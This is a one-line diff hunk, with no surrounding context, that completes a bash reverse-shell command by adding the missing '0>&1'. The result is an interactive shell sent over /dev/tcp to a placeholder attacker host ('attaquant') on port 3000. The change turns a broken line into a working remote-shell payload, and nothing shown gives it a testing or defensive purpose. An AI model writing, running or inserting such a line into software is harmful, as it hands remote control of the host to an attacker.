@@ -1,1 +1,1 @@
-bash -i >& /dev/tcp/attaquant/3000 0>&
+bash -i >& /dev/tcp/attaquant/3000 0>&1
